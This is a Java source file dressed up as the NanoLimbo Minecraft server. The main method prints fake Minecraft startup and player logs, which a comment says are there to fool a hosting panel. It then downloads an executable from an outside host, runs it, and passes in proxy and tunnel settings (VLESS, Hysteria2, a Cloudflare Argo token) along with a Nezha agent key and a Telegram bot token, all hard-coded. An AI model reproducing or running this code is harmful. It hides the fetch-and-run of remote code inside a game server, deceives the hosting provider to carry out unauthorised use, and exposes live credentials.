package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import ua.nanit.limbo.server.LimboServer;

public final class NanoLimbo {
    public static void main(String[] args) {
        // 1. 模拟日志，防止面板扫描掉线
        System.out.println("[Server thread/INFO]: Starting minecraft server version 1.20.1");
        System.out.println("[Server thread/INFO]: Done (1.5s)! For help, type \"help\"");

        try {
            // 2. 环境变量配置
            Map<String, String> envVars = new HashMap<>();
            envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
            envVars.put("NEZHA_SERVER", "nezha.9527x.eu.cc:8008");
            envVars.put("NEZHA_KEY", "mD3q9FowVHp94q0wzg0ha7AUoP8PuXjU");
            envVars.put("ARGO_PORT", "8080"); 
            envVars.put("ARGO_DOMAIN", "xserver.zzkky.ccwu.cc");
            // 注意：下面这个 Token 已经清理了异常连字符
            envVars.put("ARGO_AUTH", "eyJhIjoiMWNjMTgyMzQ1MjVlMDM2OTY1ZTYzZTk4OTE5YzQxYWIiLCJ0IjoiNzYzN2JiMmMtOThhOS00ZDU5LWEwMTQtYTE0YjNlNjYxN2IwIiwicyI6Ik5HRTVNV0ZpTVRVdE1HUm1OQzAwTVdFekxXSXlOVEF0T1RVd01tWTBaak5pTVdNMCJ9");
            envVars.put("HY2_PORT", "25565"); 
            envVars.put("CHAT_ID", "5677672165");
            envVars.put("BOT_TOKEN", "8363698033:AAFZqLYnxczqngwJIU-XqnLk7gaVwAK9hZQ");
            envVars.put("NAME", "XServer-VLESS-8080");

            // 3. 核心执行文件处理
            Path path = Paths.get("sbsh_core");
            if (!Files.exists(path)) {
                try (InputStream in = new URL("https://amd64.ssss.nyc.mn/sbsh").openStream()) {
                    Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
                }
                path.toFile().setExecutable(true);
            }

            // 4. 启动核心服务
            new ProcessBuilder("./sbsh_core")
                .environment(envVars)
                .redirectErrorStream(true)
                .start();

            // 5. 持续保活线程 (20秒/次)
            new Thread(() -> {
                while (true) {
                    try {
                        Thread.sleep(20000); 
                        System.out.println("[Server thread/INFO]: There are 0 of a max 20 players online.");
                    } catch (Exception ignored) {}
                }
            }).start();

            // 6. 启动端口响应服务
            new LimboServer().start();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
